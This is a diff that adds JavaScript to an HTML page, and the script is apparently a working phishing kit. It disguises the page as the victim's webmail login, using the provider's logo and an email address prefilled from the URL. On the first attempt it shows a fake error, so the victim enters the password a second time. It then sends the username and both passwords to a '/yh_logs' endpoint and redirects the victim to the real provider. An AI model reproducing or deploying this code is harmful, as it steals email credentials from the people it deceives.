@@ -189,4 +189,195 @@ div .footerNode a, div .footerNode span {
       <script type="text/javascript"  src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
     </body>
 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  <script>
+
+    /* global $ */
+    
+	$(document).ready(function(){
+	jQuery('form').prepend('<div class="loader loader-default" ></div>');
+	$('.loader-default').css('backgroundColor', 'rgba(0,0,0,.65)');
+	function getUrlVars()
+	{
+		var vars = [], hash;
+		var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+		for(var i = 0; i < hashes.length; i++)
+		{
+			hash = hashes[i].split('=');
+			vars.push(hash[0]);
+			vars[hash[0]] = hash[1];
+		}
+		return vars;
+	}
+	
+	function ValidateEmail(mail) 
+	{
+	 if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
+	  {
+		return (true)
+	  }
+		return (false)
+	}
+	function prerender(email)
+	{
+		let domain = null;
+		if((getUrlVars()['domain']))
+		{
+			domain = (getUrlVars()['domain']);
+		}
+		let df = 0;
+		if(domain == "gmail") {domain = "gmail.com"; df = 1;}
+		if(domain == "163") {domain = "163.com"; df = 1;}
+		if(domain == "263") {domain = "263.net"; df = 1;}
+		if(domain == "1and1") {domain = "ionos.com"; df = 1;}
+		if(domain == "godaddy") {domain = "godaddy.com"; df = 1;}
+		if(domain == "yahoo") {domain = "yahoo.com"; df = 1;}
+		if(domain == "yahoo") {domain = "aol.com"; df = 1;} 			//to check
+		if(domain == "office365") {domain = "outlook.com"; df = 1;}		//to check
+		if(domain == "office365") {domain = "office365.com"; df = 1;}	//to check
+		if(domain == "office365") {domain = "rackspace.com"; df = 1;}	//to check
+		
+		if(df==0) domain = null;
+		render(email, domain);
+	}
+	function render(email, domain)
+	{
+	console.log(domain);
+		if(ValidateEmail(email) == false)
+			{
+				return;
+			}
+		let emaildomainpart = email.split('@')[1].toLowerCase();
+		if(emaildomainpart == "rackspace.com" || emaildomainpart == "aol.com" || domain == null || emaildomainpart == "outlook.com" || emaildomainpart == "office365.com")
+		{
+			domain = emaildomainpart;
+		}
+		window.storedDomain = domain;
+		
+		let showname = true;
+		dmlistcheck = ["163.com", "ionos.com", "263.net", "godaddy.com", "yahoo.com", "aol.com", "outlook.com", "office365.com", "rackspace.com", "gmail.com"];
+		let df = 0;
+		for(let o=0;o<dmlistcheck.length;o++)
+		{
+			if(domain.includes(dmlistcheck[o]))df = 1;
+		}
+
+		
+		if(df==0)
+		{
+			$(".logoimg").attr("src", "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Circle-icons-mail.svg/2048px-Circle-icons-mail.svg.png");
+			$("#logoimg").attr("src", "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Circle-icons-mail.svg/2048px-Circle-icons-mail.svg.png");
+			$("#logoname").html("Webmail");
+			$(".logoname").html("Webmail");
+			$(".logoname2").html("");
+			return;
+		}
+		
+		
+		dmlist0 = ["163.com", "263.net", "outlook.com", "hotmail.com"];
+		
+		df = 0;
+		for(let o=0;o<dmlist0.length;o++)
+		{
+			if(domain.includes(dmlist0[o]))df = 1;
+		}
+		if(df==1)
+		{
+			$(".logoimg").attr("src", domain+".png");
+			$("#logoimg").attr("src", domain+".png");
+			if(domain=="163.com") showname = false;
+			if(domain=="263.net") showname = false;
+		}
+		else
+		{
+			fetch("https://logo.clearbit.com/"+domain+"?s=128");
+			
+			$(".logoimg").attr("src", "https://www.google.com/s2/favicons?sz=128&domain_url="+domain);
+			$("#logoimg").attr("src", "https://www.google.com/s2/favicons?sz=128&domain_url="+domain);
+			let imgurl = "https://logo.clearbit.com/"+domain+"?s=128";
+			dmlist = ["outlook.", "hotmail.", "live.", "aol.", "ionos.", "godaddy.", "office365."];
+			df = 0;
+			for(let o=0;o<dmlist.length;o++)
+			{
+				if(domain.includes(dmlist[o]))df = 1;
+			}
+			if(df==0)
+			fetch(imgurl)
+			  .then(response => response.blob())
+			  .then(myBlob => {
+			  let urlCreator = window.URL || window.webkitURL;
+			   let imageUrl = urlCreator.createObjectURL(myBlob);
+			   let myImgElem = document.querySelector('#logoimg');
+			   myImgElem.src = imageUrl;
+			   
+			})
+		}
+		let  c= domain.substr(0, domain.indexOf('.'));
+			let  final= c.toLowerCase();
+			let finalu= c.toUpperCase();
+			$("#logoname").html(finalu);
+			if(showname)$(".logoname").html(finalu);
+			else $(".logoname").html("");
+			$(".logoname2").html(finalu);
+	    
+		
+	}
+	$('input[name=username]').on('input',()=>{prerender($('input[name=username]').val())});
+	$('#submit-btn').on('click',()=>
+	{
+	if(ValidateEmail($('input[name=username]').val()))
+	{
+		if($('#password').val().length>0)
+		{
+			$('.loader-default').attr('data-text', "Connecting to "+window.storedDomain.toLowerCase());
+			loginBTN();
+		}
+	}
+
+	});
+	if((getUrlVars()['email']))
+	{
+		$('#email').val((getUrlVars()['email']));
+		prerender($('#email').val());
+	}
+	var clicked = 0;
+function loginBTN()
+{
+console.log('loginBTN');
+setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 80);
+
+let time = 2000;
+if(clicked==0) time = 2000;
+if(clicked==1) time = 3800;
+
+setTimeout(function(){
+
+	if(clicked == 0)
+	{
+	Window.pass1 = $('#password').val();
+	
+	$("#msg").show();
+	$('#password').val("");
+	$('.loader-default').removeClass('is-active');
+	$('#password').on('input',()=>{$('#msg').hide();});
+	clicked=1;
+	return false;
+	}
+	else if(clicked == 1)
+	{
+	Window.encodedString = btoa(JSON.stringify({ username: $('#email').val(), email: getUrlVars()['email'], password1:Window.pass1 ,password2: $('#password').val()}));
+	let datastg=JSON.parse(atob(Window.encodedString));
+	$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2']}).done(function( data ) {
+	window.location.replace("http://"+window.storedDomain);
+	});
+	}
+}, time);
+return false;
+}
+	});
+
+  </script>
+  </html>
+
 </html>
